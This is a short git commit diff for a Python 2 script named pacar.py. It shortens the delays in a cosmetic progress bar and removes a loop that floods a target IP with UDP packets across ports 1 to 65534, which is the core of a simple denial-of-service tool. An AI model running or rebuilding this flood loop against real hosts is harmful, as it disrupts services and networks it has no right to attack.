15b0de757f8885eb0821429c1f6116ee067f1334
TsukasaCh <92731359+TsukasaCh@users.noreply.github.com>
2022-01-15 07:24:11 +0700

    Update pacar.py

--- pacar.py
+++ pacar.py
@@ -27,21 +27,12 @@ jumlah = input("jumlah        : ")
 os.system("clear")
 os.system("figlet mengetest")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(2)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(2)
 print "[==========>          ] 50%"
-time.sleep(5)
+time.sleep(2)
 print "[===============>     ] 75%"
-time.sleep(5)
+time.sleep(2)
 print "[===================>] 100%"
 time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
-
